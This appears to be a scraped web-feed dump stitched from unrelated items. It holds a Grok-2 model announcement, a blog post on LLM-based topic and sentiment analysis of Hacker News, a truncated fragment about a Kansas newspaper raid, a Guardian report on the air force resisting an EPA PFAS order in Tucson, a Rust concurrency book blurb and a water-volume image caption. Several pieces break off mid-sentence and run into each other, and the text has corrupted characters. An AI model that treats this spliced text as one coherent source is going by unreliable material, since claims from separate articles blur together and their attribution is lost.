This release includes two members of the Grok family: Grok-2 and Grok-2 mini. Both models are now being released to Grok users on the ùïè platform.</p></div></div><div><main><div><p><strong>We are excited to release an early preview of Grok-2, a significant step forward from our previous model Grok-1.5, featuring frontier capabilities in chat, coding, and reasoning. At the same time, we are introducing Grok-2 mini, a small but capable sibling of Grok-2. An early version of Grok-2 has been tested on the LMSYS leaderboard under the name "sus-column-r." At the time of this blog post, it is outperforming both Claude 3.5 Sonnet and GPT-4-Turbo.</strong></p><p>Grok-2 and Grok-2 mini are currently in beta on ùïè, and we are also making both models available through our enterprise API later this month.</p><h3 id="grok-2-language-model-and-chat-capabilities">Grok-2 language model and chat capabilities</h3><p>We introduced an early version of Grok-2 under the name "sus-column-r" into the LMSYS chatbot arena, a popular competitive language model benchmark. It outperforms both Claude and GPT-4 on the LMSYS leaderboard in terms of its overall Elo score.</p></div>

<div><p>Internally, we employ a comparable process to evaluate our models. Our AI Tutors engage with our models across a variety of tasks that reflect real-world interactions with Grok. During each interaction, the AI Tutors are presented with two responses generated by Grok. They select the superior response based on specific criteria outlined in our guidelines. We focused on evaluating model capabilities in two key areas: following instructions and providing accurate, factual information. Grok-2 has shown significant improvements in reasoning with retrieved content and in its tool use capabilities, such as correctly identifying missing information, reasoning through sequences of events, and discarding irrelevant posts.</p><h2 id="benchmarks">Benchmarks</h2><p>We evaluated the Grok-2 models across a series of academic benchmarks that included reasoning, reading comprehension, math, science, and coding. Both Grok-2 and Grok-2 mini demonstrate significant improvements over our previous Grok-1.5 model. They achieve performance levels competitive to other frontier models in areas such as graduate-level science knowledge (GPQA), general knowledge (MMLU, MMLU-Pro), and math competition problems (MATH). Additionally, Grok-2 excels in vision-based tasks, delivering state-of-the-art performance in visual math reasoning (MathVista) and in document-based question answering (DocVQA).</p></div>

            <description><![CDATA[<p>URL: <a href="https://outerbounds.com/blog/hacker-news-sentiment/">https://outerbounds.com/blog/hacker-news-sentiment/</a>, See on <a href="https://news.ycombinator.com/item?id=41241124">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="post-content" itemprop="articleBody"><hr><p><strong>tl;dr</strong>
We analyzed all Hacker News posts with more than five comments between January 2020 and June 2023.
Leveraging LLama3 70B LLM, we examined both the posts and their associated comments to gain insights
into how the Hacker News community engages with different topics. You can download the datasets
we produced at the bottom of the article.</p><p>Use the tool below to explore various topics and the sentiments they evoke. The sentiment column
reports the median sentiment score, 0 being the most negative sentiment and 9 the most positive.
Click on the column headers to discover topics that inspire strong reactions, whether positive or
negative, and to identify divisive subjects that tend to generate polarized commentary.</p><h2 id="motivation">Motivation<a href="#motivation" aria-label="Direct link to Motivation" title="Direct link to Motivation">‚Äã</a></h2><p>If you have been following Hacker News for a while, you have likely developed an intuition
for the topics that the community loves - and topics the community loves to hate.
If you port <strong>Factorio</strong> to run on <strong>ZX Spectrum</strong> using <strong>Rust</strong>, you will be overwhelmed
with love and karma. On the other hand, you better don an asbestos suit if, instead
of raising a <strong>funding round</strong>, you sell your startup to a <strong>private equity</strong> company
so they can add <strong>telemetry</strong> in the codebase to power <strong>targeted ads</strong>.</p><p>But that's just a hazy intuition! Since the community is a big believer in <strong>rationality</strong>
and <strong>data science</strong> (the phrase is divisive though), we would be in a stronger position
if we could back our hunch with proper <strong>data analysis</strong>.</p><p>Also, it would give us an excuse to play with <strong>large language models</strong> which, all the
<strong>AI hype</strong> aside, are mind-blowingly effective at practical tasks like this. And,
we happen to be developers of an <strong>open source</strong> tool,
<a href="https://github.com/netflix/metaflow" target="_blank" rel="noopener noreferrer">Metaflow</a>, written in <strong>Python</strong>,
which makes it <strong>fun</strong> and <strong>educational</strong> to <strong>hack</strong> projects like this.</p><p>Type the bolded phrases in the textbox above to see if we are optimizing for an
appropriate <strong>emotional response</strong>. </p><h2 id="what-topics-trend-on-hacker-news">What topics trend on Hacker News?<a href="#what-topics-trend-on-hacker-news" aria-label="Direct link to What topics trend on Hacker News?" title="Direct link to What topics trend on Hacker News?">‚Äã</a></h2><p>As described in the implementation section below, we downloaded about 100,000 pages posted
on Hacker News to understand what content resonates with the community. We focus on posts
that gained at least 20 upvotes and 5 comments, prompting a large language model to come
up with ten phrases that best describe each page.</p><p>Here are the top 20 topics, aggregated from the 100,000 pages, along with the number of
posts covering each topic:</p><p><img loading="lazy" src="https://outerbounds.com/assets/images/top_topics-f47d2ee20906766a39ed8fdb2908c264.png" width="1295" height="1033"></p><p>The top topics are hardly surprising. However, the community is known for having
diverse intellectual interests. The top 20 topics represent only 10% of the topics
covered across posts. You can see this by yourself by using the tool above that
cover all the 14,000 topics that are associated with at least five posts.</p><p>Have the top topics evolved over time? You bet. Here are the top-10 trending
topics:</p><p><img loading="lazy" src="https://outerbounds.com/assets/images/growing_topics-955fdd56864b7346df6f39888123e4a4.png" width="1410" height="1019"></p><p>Even though the dataset only extends to June 2023, we can see a tsunami
of AI, natural language processing, and related topics. Sadly, layoffs started
trending mid-2022 as well. The rise of AI articles likely explains the growth
in the Technology topic as well.</p><h2 id="whats-declining">What's declining<a href="#whats-declining" aria-label="Direct link to What's declining" title="Direct link to What's declining">‚Äã</a></h2><p>In 2020-2022, an overwhelming macro-trend was everything related
to the COVID pandemic which fortunately is not a pressing issue
anymore. Fascinatingly, August 2021 was a tumultuous month with especially
<a href="https://www.wired.com/story/apple-photo-scanning-csam-communication-safety-messages/" target="_blank" rel="noopener noreferrer">Apple's proposed CSAM
scanning</a>
causing an uproar in posts related to Privacy and Apple.</p><p><img loading="lazy" src="https://outerbounds.com/assets/images/declining_topics-fded256187c75900d3f7871a9acae077.png" width="1471" height="1048"></p><p>If you want to take a trip down the memory lane, consider the past
topics on the left which haven't been covered once since January 2022:</p><table><thead><tr><th>Before Jan 2022 üìâ</th><th>After Jan 2022 üìà</th></tr></thead><tbody><tr><td>George Floyd</td><td>GPT-4</td></tr><tr><td>Herd immunity</td><td>Stable Diffusion</td></tr><tr><td>Antibodies</td><td>Russia-Ukraine War</td></tr><tr><td>IOS 14</td><td>Ventura</td></tr><tr><td>Freenode</td><td>Bank Failure</td></tr><tr><td>Suez Canal</td><td>Midjourney</td></tr><tr><td>Wallstreetbets</td><td>Hiring Freeze</td></tr><tr><td>Hydroxychloroquine</td><td>FIDO Alliance</td></tr><tr><td>Infection rates</td><td>Cost of living crisis</td></tr></tbody></table><p>Correspondingly, the topics on the right didn't exist before
January 2022. It doesn't take a PhD in Economics to understand how
<em>Wallstreetbets</em> got replaced by <em>Cost of living crisis</em>,
<em>Hiring freeze</em>, and <em>Bank failure</em>.</p><h2 id="but-how-do-people-feel-about-these-topics">But how do people <em>feel</em> about these topics<a href="#but-how-do-people-feel-about-these-topics" aria-label="Direct link to but-how-do-people-feel-about-these-topics" title="Direct link to but-how-do-people-feel-about-these-topics">‚Äã</a></h2><p>Importantly, sharing or upvoting a post doesn't imply endorsement - <a href="https://xkcd.com/386/" target="_blank" rel="noopener noreferrer">often the opposite</a>. Hence
to truly understand the dynamics of a community, we need to analyze how people react to posts, as expressed
through their comments.</p><p>To do this, we reconstructed comment threads associated with the posts in the dataset and asked
an LLM to classify the sentiment of the discourse between 0 and 9, zero being an all-out flamewar
and nine indicating a perfect harmony and positivity.</p><p>Our dutiful LLM took the job as a virtual community moderator and went through 100k comment threads in
about 9 hours, reading through 230M words consisting of the full emotional gamut of bitterness,
passion, wisdom, humor, and love.</p><p>Here's what the LLM came back with in terms of the distribution of sentiments:</p><p><img loading="lazy" src="https://outerbounds.com/assets/images/sentiment-distribution-da1bd4c602de66b6f1ef68cb3434a4f8.png" width="721" height="399"></p><p>Firstly, the LLM is utterly befuddled about what a neutral discussion looks like - there are no 5 in the results.
Or, maybe this is a snarky note by the LLM noting that humans are incapable of unemotional, unbiased discourse.</p><p>Secondly, the sentiments are clearly skewed
towards the positive side, which aligns with our personal experience with the site. The bias to
positivity and optimism is a key reason why we open Hacker News daily. There's enough vitriol elsewhere.</p><p>It is also worth noting that at least some of the few ones assigned by the machine seem to be bogus.
For instance, <a href="https://news.ycombinator.com/item?id=32088537" target="_blank" rel="noopener noreferrer">this post by BentoML</a> was given a score of one,
although the sentiment seems majorly positive and supportive. All the usual caveats about LLMs apply.</p><p>Now with the topics and the sentiment scores at hand, we can finally give a scientific answer to the question of
what the community loves and loves to hate:</p><table><thead><tr><th>Love üòç</th><th>Hate üò†</th></tr></thead><tbody><tr><td>Programming</td><td>FTX</td></tr><tr><td>Computer Science</td><td>Police Misconduct</td></tr><tr><td>Open Source</td><td>Sam Bankman-Fried</td></tr><tr><td>Python</td><td>Xinjiang</td></tr><tr><td>Game Development</td><td>Torture</td></tr><tr><td>Rust</td><td>Employee Monitoring</td></tr><tr><td>Electronics</td><td>Cost Cutting</td></tr><tr><td>Mathematics</td><td>Racial Profiling</td></tr><tr><td>Functional Programming</td><td>Online Safety Bill</td></tr><tr><td>Programming Language</td><td>War on Terror</td></tr><tr><td>Physics</td><td>Atlassian</td></tr><tr><td>Embedded Systems</td><td>CSAM</td></tr><tr><td>Self Improvement</td><td>NYPD</td></tr><tr><td>Database</td><td>Alameda Research</td></tr><tr><td>Unix</td><td>International Students</td></tr><tr><td>Astronomy</td><td>TSA</td></tr><tr><td>Retro Computing</td><td>Earn It Act</td></tr><tr><td>Nostalgia</td><td>Car Features</td></tr><tr><td>Debugging</td><td>Bloatware</td></tr></tbody></table><p>Geeks, nerds, and hackers should find themselves right at home! Interestingly, while the community tends to be
visionary and forward-looking (with technical matters at least), it definitely has a soft spot for (technical) nostalgia.
While the modern world is amazing, we miss ZX Spectrum, Z80 assembly, and 8086 dearly. At least we find some
comfort in PICO-8.</p><p>On the anger-inducing side, most topics need no explanation. It is worth clarifying though that Hacker News does not
hate International Students, but the posts related to them tend to be overwhelmingly negative,
reflecting the community‚Äôs sympathy for the challenges faced by those studying abroad.</p><p>Comically, Hacker News is not a community of car lovers. When we talk about cars, it is because there's
something wrong with them. For more insights like this, use the tool at the top of the page to explore
the diverse landscape of HN topics in detail.</p><h2 id="some-topics-are-just-divisive">Some topics are just divisive<a href="#some-topics-are-just-divisive" aria-label="Direct link to Some topics are just divisive" title="Direct link to Some topics are just divisive">‚Äã</a></h2><p>Besides topics being unimodally love or hate-inducing, some topics are bimodal: Sometimes
a post about the topic generates a highly positive response, other times a flamewar. Examples include</p><ul><li><strong>GNOME</strong> - <a href="https://www.mayrhofer.eu.org/post/kde-vs-gnome/" target="_blank" rel="noopener noreferrer">KDE vs. GNOME</a> - the war has been raging for 25 years.</li><li><strong>Google</strong> - a dominant force in the Internet, both in good and bad.</li><li><strong>Government regulations</strong> - damned if you do and damned if you don't.</li><li><strong>Venture capital</strong> - the lifeblood of Silicon Valley and a source of endless gossip.</li></ul><p>See more by sorting by the <code>divisive</code> column in the tool above. To rank highly by the divisiveness
score, the topic must be associated with both negative and positive posts equally
and not many neutral ones.</p><h2 id="is-the-mood-improving">Is the mood improving?<a href="#is-the-mood-improving" aria-label="Direct link to Is the mood improving?" title="Direct link to Is the mood improving?">‚Äã</a></h2><p><em>Cue <a href="https://en.wikipedia.org/wiki/Betteridge%27s_law_of_headlines" target="_blank" rel="noopener noreferrer">Betteridge's Law</a></em>.</p><p>We can plot the average sentiment over time, as expressed in daily comment threads:</p><p><img loading="lazy" src="https://outerbounds.com/assets/images/sentiment-over-time-97569616155ec98e8d15c008b62591bc.png" width="1147" height="818"></p><p>The data proves that things sucked in August 2021 (or maybe it was just the Apple debacle highlighted
in the chart above). Overall, there's a clear but modest downward trend in the average sentiment.</p><p>It
would require a deeper analysis to understand why this is the case. Putting aside an obvious hypothesis
that life is just getting worse (which <a href="https://en.wikipedia.org/wiki/Factfulness" target="_blank" rel="noopener noreferrer">might not be true</a>),
an alternative hypothesis may be a variant of
<a href="https://en.wikipedia.org/wiki/Eternal_September" target="_blank" rel="noopener noreferrer">Eternal September</a>. It takes conscious and tireless
effort to maintain a positive mood in a growing community. Kudos to HN moderators for keeping the
community thriving and positive over the years!</p><h2 id="implementation">Implementation<a href="#implementation" aria-label="Direct link to Implementation" title="Direct link to Implementation">‚Äã</a></h2><p>A reason to be excited and optimistic about the future is the very existence of this article.
While natural language processing and sentiment analysis have been around for decades,
the quality, versatility, and the ease of use afforded by LLMs is absolutely unprecedented.</p><p>Attaining the quality
of topics and sentiment scores with a messy dataset like the one here would have required a PhD-thesis
level of effort just a few years ago - and very likely the results would have been worse. In contrast,
we developed all the code for this article in about seven hours. Processing 350M tokens with just
a decent-sized model would have required a supercomputer a decade ago, whereas in our case it took about 16 hours
using widely available hardware.</p><p>Most amazingly, all the building blocks, LLMs included, are available in open source! Let's do a
quick overview (with code and data), showing how you can repeat the experiment at home.</p><p>Here's what we did at the high level:</p><p><img loading="lazy" src="https://outerbounds.com/assets/images/hacker-news-architecture-cec4efca1150350d4bb35ac06dfb7761.png" width="1920" height="1080"></p><p>Each white box in the picture is <a href="https://docs.metaflow.org/" target="_blank" rel="noopener noreferrer">a Metaflow flow</a>, linked below:</p><ol><li><a href="https://github.com/outerbounds/hacker-news-sentiment/blob/main/hninit.py" target="_blank" rel="noopener noreferrer"><code>HNSentimentInit</code></a> creates a list of posts to analyze.</li><li><a href="https://github.com/outerbounds/hacker-news-sentiment/blob/main/hncrawl.py" target="_blank" rel="noopener noreferrer"><code>HNSentimentCrawl</code></a> downloads the posts.</li><li><a href="https://github.com/outerbounds/hacker-news-sentiment/blob/main/hnposts.py" target="_blank" rel="noopener noreferrer"><code>HNSentimentAnalyzePosts</code></a> parses the posts and runs them through an LLM.</li><li><a href="https://github.com/outerbounds/hacker-news-sentiment/blob/main/hncomments.py" target="_blank" rel="noopener noreferrer"><code>HNSentimentCommentData</code></a> reconstructs comment threads based on <a href="https://console.cloud.google.com/marketplace/product/y-combinator/hacker-news" target="_blank" rel="noopener noreferrer">a Hacker News dataset in Google BigQuery</a>.

generated some discussion. Using <a href="https://huggingface.co/datasets/julien040/hacker-news-posts" target="_blank" rel="noopener noreferrer">a publicly
available dataset of HN posts</a>
(<a href="https://julienc.me/" target="_blank" rel="noopener noreferrer">thanks Julien!</a>), we queried all posts between
January 2020 and June 2023 (the latest date available in this dataset) which had at
least 20 upvotes and more than five comments, which resulted in about 100,000 posts.
<a href="https://github.com/outerbounds/hacker-news-sentiment/blob/main/hninit.py" target="_blank" rel="noopener noreferrer">Here's the simple Metaflow flow</a>
that did the job, much thanks to DuckDB.</p><p>Since the 100,000 posts are mostly on different domains, we can safely download
them in parallel without DDOS'ing the servers. It took only around 25 minutes to
download the pages with 100 parallel workers
(<a href="https://github.com/outerbounds/hacker-news-sentiment/blob/main/hncrawl.py" target="_blank" rel="noopener noreferrer">see here how</a>).</p><h3 id="large-scale-document-understanding-with-llms">Large-scale document understanding with LLMs<a href="#large-scale-document-understanding-with-llms" aria-label="Direct link to Large-scale document understanding with LLMs" title="Direct link to Large-scale document understanding with LLMs">‚Äã</a></h3><p>Parsing the text content from random HTML pages used to be a massive PITA, but
<a href="https://beautiful-soup-4.readthedocs.io/en/latest/" target="_blank" rel="noopener noreferrer">BeautifulSoup</a> makes it <a href="https://github.com/outerbounds/hacker-news-sentiment/blob/main/hnposts.py#L94" target="_blank" rel="noopener noreferrer">beautifully
straightforward</a>.</p><p>At this point, we have a relatively clean dataset of about 100,000 text documents with
more than 500M tokens in total. Processing the dataset once with a state-of-the-art LLM,
say, GPT-4o, or Llama3 70b on AWS Bedrock would cost around $1,300 (using ChatGPT batch API),
not counting the output tokens. Besides the cost, time is a concern - we want to process
the dataset as fast as possible, so we can evaluate the results quickly, and rinse-and-repeat
if needed. Hence we don't want to get rate-limited or otherwise bottlenecked by the APIs.</p><p>We have <a href="https://outerbounds.com/blog/document-understanding/" target="_blank" rel="noopener noreferrer">posted previously</a> about our
success with <a href="https://outerbounds.com/blog/nim-announcement/" target="_blank" rel="noopener noreferrer">NVIDIA NIM microservices</a> that
provide a quickly growing library of LLMs and other GenAI models as prepackaged images,
fully optimized to take advantage of vLLM, TensorRT-LLM and the Triton Inference Server,
so you don't have to spend time <a href="https://outerbounds.com/blog/the-many-ways-to-deploy-a-model/#measuring-performance" target="_blank" rel="noopener noreferrer">chasing the latest tricks with LLM
inference</a>.</p><p>Since we had NIMs included in <a href="https://outerbounds.com/platform" target="_blank" rel="noopener noreferrer">our Outerbounds deployment</a>,
we just <a href="https://github.com/outerbounds/hacker-news-sentiment/blob/main/hnposts.py#L40" target="_blank" rel="noopener noreferrer">added <code>@nim</code> to our flow</a>
to get  access to a high-throughput LLM endpoint that costs only as much as the auto-scaling GPUs
it runs on, in this case, four H100 GPUs. Naturally you can hit an LLM endpoint of your
choosing - the options are many these days.</p><h3 id="prompting-an-llm-to-produce-a-list-of-topics-for-each-post">Prompting an LLM to produce a list of topics for each post<a href="#prompting-an-llm-to-produce-a-list-of-topics-for-each-post" aria-label="Direct link to Prompting an LLM to produce a list of topics for each post" title="Direct link to Prompting an LLM to produce a list of topics for each post">‚Äã</a></h3><p>Our prompt is straightforward:</p><div open=""><pre tabindex="0"><code><span><span>Assign 10 tags that best describe the following article.</span><br></span><span><span>Reply only the tags in the following format:</span><br></span><span><span>1. first tag</span><br></span><span><span>2. second tag</span><br></span><span><span>N.

limit the number of tokens to 5,000 to account for differences in the tokenizer behavior,
making sure that we don't go past the limit. </p><p>Processing about 140M inputs tokens in this manner took about 9 hours. We were able to
increase throughput to around 4,300 input tokens per second by hitting the model concurrently
with five workers, as neatly shown in our UI below, to take advantage of dynamic batching
and other optimizations.</p><p><img loading="lazy" src="https://outerbounds.com/assets/images/sentiment-mfgui-582a32fc57b12b9a0835e61997598237.png" width="1869" height="950"></p><p>Instead of trying to download 100,000 comment pages directly from Hacker News, we
leveraged <a href="https://console.cloud.google.com/marketplace/product/y-combinator/hacker-news" target="_blank" rel="noopener noreferrer">a Hacker News dataset in Google
BigQuery</a>.
Annoyingly, comments in the database are not directly associated with their parent
post, so we had to implement <a href="https://github.com/outerbounds/hacker-news-sentiment/blob/main/hncomments.py#L152" target="_blank" rel="noopener noreferrer">a small function to reconstruct the comment
threads</a>.</p><p>We can't run the function with BigQuery directly but luckily we can export the data easily
in Parquet files. Loading the resulting 16M rows in DuckDB and scanning through them
was a breeze, aided by the fact that Metaflow knows how to <a href="https://outerbounds.com/blog/metaflow-fast-data/" target="_blank" rel="noopener noreferrer">load data
fast</a>. We just
added <code>@resources(disk=10000, cpu=8, memory=32000)</code>  to run the function on a large enough instance.</p><h3 id="prompting-an-llm-to-analyze-sentiment">Prompting an LLM to analyze sentiment<a href="#prompting-an-llm-to-analyze-sentiment" aria-label="Direct link to Prompting an LLM to analyze sentiment" title="Direct link to Prompting an LLM to analyze sentiment">‚Äã</a></h3><p>With the comment threads at hand, we were able to <a href="https://github.com/outerbounds/hacker-news-sentiment/blob/main/hnsentiment.py" target="_blank" rel="noopener noreferrer">run them through our
LLM</a> with this prompt:</p><div open=""><pre tabindex="0"><code><span><span>In the scale between 0-10 where 0 is the most negative sentiment</span><br></span><span><span>and 10 is the most positive sentiment, rank the following discussion.</span><br></span><span><span>Reply in this format:</span><br></span><span><span></span><br></span><span><span>SENTIMENT X</span><br></span><span><span></span><br></span><span><span>where X is the sentiment rating</span><br></span><span><span>---</span><br></span><span><span>[First 3000 tokens from a comment thread]</span><br></span></code></pre></div><p>Getting a simple structured output like this seems to work without issues. We processed
through some 230M input tokens in this manner, which took only about 7 hours as we
needed only two output tokens.</p><p>You can reproduce all the steps above using your favorite toolchain. Here are
key reasons why we used Metaflow and why you might want to consider it too:</p><ul><li><p><strong>Staying organized without effort</strong> - a big benefit compared to random Python
scripts or notebooks is that Metaflow persists all artifacts automatically, tracks all
executions, and keeps everything organized. We relied on <a href="https://docs.metaflow.org/scaling/tagging" target="_blank" rel="noopener noreferrer">Metaflow's
namespaces</a> to execute large and expensive
runs alongside prototypes, knowing that the two can't interfere with each other. We
used <a href="https://outerbounds.com/blog/five-ways-to-use-the-new-metaflow-tags/" target="_blank" rel="noopener noreferrer">Metaflow tags</a>
to organize data sharing between flows while they were being developed independently.</p></li><li><p><strong>Easy cloud scaling</strong> - crawling required <a href="https://docs.metaflow.org/scaling/remote-tasks/introduction#running-many-tasks-in-parallel-with-foreach" target="_blank" rel="noopener noreferrer">horizontal
scaling</a>,
DuckDB required <a href="https://docs.metaflow.org/scaling/remote-tasks/introduction#requesting-compute-resources" target="_blank" rel="noopener noreferrer">vertical scaling</a>,
and LLMs required <a href="https://docs.metaflow.org/scaling/remote-tasks/gpu-compute" target="_blank" rel="noopener noreferrer">a GPU backend</a>.
Metaflow handled all the cases out of the box.</p></li><li><p><strong>Highly available orchestrator</strong> - running a large dataset through an LLM can cost
thousands of dollars. You don't want the run to fail because of random issues.
We relied on <a href="https://docs.metaflow.org/production/introduction" target="_blank" rel="noopener noreferrer">a highly available Argo Workflows
orchestrator</a> that Metaflow
supports out of the box to keep the run running for hours.</p></li></ul><p>You can do all of the above using <a href="https://metaflow.org/" target="_blank" rel="noopener noreferrer">open-source Metaflow</a>, but we had a few
additional benefits by running the flows on <a href="https://outerbounds.com/platform" target="_blank" rel="noopener noreferrer">Outerbounds Platform</a>:
It is simply fun to develop code like this, including notebooks, with VSCode running on
<a href="https://outerbounds.com/features/cloud-workstations/" target="_blank" rel="noopener noreferrer">cloud workstations</a>,
<a href="https://outerbounds.com/features/compute-at-scale/" target="_blank" rel="noopener noreferrer">scaling to the cloud</a> is smooth sailing,
and <a href="https://outerbounds.com/blog/nim-announcement/" target="_blank" rel="noopener noreferrer"><code>@nim</code></a> allowed us to hit LLMs without
worrying about cost or rate limiting.</p><p>If features like this sound relevant to your interests, we are happy
to <a href="https://outerbounds.com/get-started/" target="_blank" rel="noopener noreferrer">get you started for free</a>.</p><h2 id="dive-deeper-at-home">Dive deeper at home<a href="#dive-deeper-at-home" aria-label="Direct link to Dive deeper at home" title="Direct link to Dive deeper at home">‚Äã</a></h2><p>There's much more that can be analyzed and visualized with this dataset. Instead of spending
a few thousand dollars hitting OpenAI APIs, you can
<a href="https://github.com/outerbounds/hacker-news-sentiment/tree/main/data" target="_blank" rel="noopener noreferrer">download the topics and sentiments we created</a>:</p><ul><li><p><code>post-sentiment.json</code> contains a mapping <code>post_id -&gt; sentiment_score</code></p></li><li><p><code>post-topics.json</code> contains a mapping <code>post_id -&gt; [topics]</code></p></li><li><p><code>topics-data.json</code> contains a cleaned and joined dataset based on the above JSONs,
powering the tool at the top of this article.</p></li></ul><p>You can find metadata related to post IDs in <a href="https://huggingface.co/datasets/julien040/hacker-news-posts" target="_blank" rel="noopener noreferrer">this HuggingFace
dataset</a> and in the
<a href="https://console.cloud.google.com/marketplace/product/y-combinator/hacker-news" target="_blank" rel="noopener noreferrer">Google BigQuery Hacker News

sentiments and topics. Our hunch is that certain domains produce predominantly positive
sentiments and vice versa. Or, do divisive topics garner more points?</p><p>If you create something fun with this data, please link back to this blog article and let us

Attorneys representing Cody in a federal lawsuit over the raid are not representing him in the criminal case and did not immediately know who was representing him.</p><p>Cody justified the 11 August 2023 raid by saying he had evidence that Meyer, the newspaper and one of its reporters, Phyllis Zorn, had committed identity theft or other computer crimes in verifying the authenticity of a copy of the business owner‚Äôs state driving record provided to the newspaper by an acquaintance. The business owner was seeking Marion city council approval for a liquor license and the record showed that she potentially had driven without a valid license for years. However, she later had her license reinstated.</p><p>The prosecutors‚Äô report concluded that no crime was committed by Meyer, Zorn or the newspaper and that Cody reached an erroneous conclusion about their conduct because of a poor investigation. Zorn used the information she had to legally search an online state database using her own name.</p></div></div>]]></description>

<div id="readability-page-1" class="page"><div id="maincontent"><p>The US air force is refusing to comply with an order to clean drinking water it polluted in Tucson, <a href="https://www.theguardian.com/us-news/arizona" data-link-name="in body link">Arizona</a>, claiming federal regulators lack authority after the conservative-dominated <a href="https://www.theguardian.com/us-news/us-supreme-court" data-link-name="in body link">US supreme court</a> overturned the ‚ÄúChevron doctrine‚Äù. Air force bases contaminated the water with toxic <a href="https://www.theguardian.com/environment/pfas" data-link-name="in body link">PFAS ‚Äúforever chemicals‚Äù</a> and other dangerous compounds.</p><p>Though former US <a href="https://www.theguardian.com/environment/epa" data-link-name="in body link">Environmental Protection Agency</a> (EPA) officials and legal experts who reviewed the air force‚Äôs claim say the Chevron doctrine ruling probably would not apply to the order, the <a href="https://www.theguardian.com/us-news/us-military" data-link-name="in body link">military‚Äôs</a> claim that it would represents an early indication of how polluters will wield the controversial court decision to evade responsibility.</p><p>It appears the air force is essentially attempting to expand the scope of the court‚Äôs ruling to thwart regulatory orders not covered by the decision, said Deborah Ann Sivas, director of the Stanford University Environmental Law Clinic.</p><p>‚ÄúIt‚Äôs very odd,‚Äù she added. ‚ÄúIt feels almost like an intimidation tactic, but it will be interesting to see if others take this approach and it bleeds over.‚Äù</p><p>The supreme court in late June <a href="https://www.theguardian.com/us-news/ng-interactive/2024/jun/28/us-supreme-court-chevron-doctrine-ruling" data-link-name="in body link">overturned the 40-year-old Chevron doctrine</a>, one of its most important precedents. The decision sharply cut regulators‚Äô power by giving judges the final say in interpreting ambiguous areas of the law during rule-making. Judges previously gave deference to regulatory agency experts on such questions.</p><p>The ruling is expected to have a profound impact on the EPA‚Äôs ability to protect the public from pollution, and the Tucson dispute highlights the high stakes in such scenarios ‚Äì clean drinking water and the health of hundreds of thousands of people hangs in the balance.</p><p>Several air force bases are largely responsible for trichloroethylene (TCE) ‚Äì volatile organic compounds ‚Äì and <a href="https://www.theguardian.com/environment/pfas" data-link-name="in body link" data-component="auto-linked-tag">PFAS</a> contaminating drinking water sources in Tucson. A 10-sq-mile (26 sq km) area around the facilities and Tucson international airport were in the 1980s designated as a Superfund site, an action reserved for the nation‚Äôs most polluted areas.</p><p>The EPA in late May <a href="https://www.epa.gov/az/tiaa-tarp" data-link-name="in body link">issued an emergency order</a> under the Safe Drinking Water Act requiring the air force to develop a plan within 60 days to address PFAS contamination in the drinking water.</p><p>Filtration systems put in place in 2014 for TCE and other chemicals are currently removing PFAS, but the systems were not designed to remove PFAS, and the added burden is straining the system.</p><p>Officials previously shut down a well in 2021 when contaminated water nearly broke through the system, the EPA wrote. Such a breach could leave the <a href="https://www.theguardian.com/us-news/arizona" data-link-name="in body link" data-component="auto-linked-tag">Arizona</a> city without safe water.</p><p>The EPA order requires the development of a system specifically designed for PFAS. A similar system is estimated to cost about $25m to develop, or about 0.1% of the air force‚Äôs annual budget.</p><p>In a formal response sent to the EPA in the weeks after the supreme court reversed Chevron, the air force claimed the EPA lacked the authority to make the order, citing the case as evidence and stating ‚Äúthe EPA‚Äôs order can not withstand review‚Äù.</p><p>But legal experts noted that Chevron does not affect EPA enforcement actions like the Tucson order ‚Äì it only affects the rule-making process.</p><p>Moreover, one arm of the administration cannot sue another, so the military cannot sue the EPA, and the case would never end up in court where the Chevron decision would come into play, said Walter Mugdan, a former EPA Superfund director. Instead, it would be resolved internally by a presidential administration instead of the judiciary.</p><p>However, a business that finds itself in a similar position may try to sue the EPA, Sivas said.</p><p>The air force did not respond to specific questions about its Chevron claim, but said it ‚Äúwill continue to meet our obligations under the federal [Superfund] law‚Äù.</p><p>The crux of the rest of the air force‚Äôs refusal to comply with the order hangs on whether there is ‚Äúimminent and substantial danger‚Äù to Tucson residents. The air force noted Tucson‚Äôs drinking water was currently below the federal limit for PFAS.</p><p>But the EPA noted the filtration system was straining because it was not designed for PFAS, and the plume was especially dangerous because there are limited alternative drinking water sources in the desert. The real possibility that the system breaks and leaves people exposed or without clean water constitutes ‚Äúimminent and substantial‚Äù danger, the EPA wrote in its response.</p><p>‚ÄúThe law does not require or expect EPA to wait until people are actively being harmed,‚Äù the EPA added. ‚ÄúIn fact, Congress expects EPA to utilize its authority to prevent the harm from materializing.‚Äù</p><p>The air force also claimed it should not be forced to address the problem because the city of Tucson and state of Arizona are funding a different system to address PFAS. In response, the EPA said the new system would not be ready for years, and the air force is financially responsible for the pollution.</p><p>‚ÄúThe Air Force bears responsibility for the PFAS contamination and needs to step forward to protect the Tucson community,‚Äù the EPA wrote.</p></div></div>]]></description>

<h2>About this Book</h2>
<p>The Rust programming language is extremely well suited for concurrency, and its ecosystem has many libraries that include lots of concurrent data structures, locks, and more. But implementing those structures correctly can be difficult. Even in the most well-used libraries, memory ordering bugs are not uncommon.</p>
<p>In this practical book, Mara Bos, team lead of the Rust library team, helps Rust programmers of all levels gain a clear understanding of low-level concurrency. You‚Äôll learn everything about atomics and memory ordering and how they're combined with basic operating system APIs to build common primitives like mutexes and condition variables. Once you‚Äôre done, you‚Äôll have a firm grasp of how Rust‚Äôs memory model, the processor, and the role of the operating system all fit together.</p>
<p>With this guide, you‚Äôll learn:</p>
<ul>
<li>How Rust's type system works exceptionally well for programming concurrency correctly</li>
<li>All about mutexes, condition variables, atomics, and memory ordering</li>
<li>What happens in practice with atomic operations on Intel and ARM processors</li>
<li>How locks are implemented with support from the operating system</li>
<li>How to write correct code that includes concurrency, atomics, and locks</li>
<li>How to build your own locking and synchronization primitives correctly</li>

    <h3>Detailed Description</h3>
    
<div><p>This image shows blue spheres representing relative amounts of Earth's water in comparison to the size of the Earth. Are you surprised that these water spheres look so small? They are only small in relation to the size of the Earth. These images attempt to show three dimensions, so each sphere represents "volume." They show that in comparison to the volume of the globe, the amount of water on the planet is very small. Oceans account for only a "thin film" of water on the surface.</p>
<p><strong>Spheres representing all of Earth's water, Earth's liquid fresh water, and water in lakes and riv</strong>ers</p>
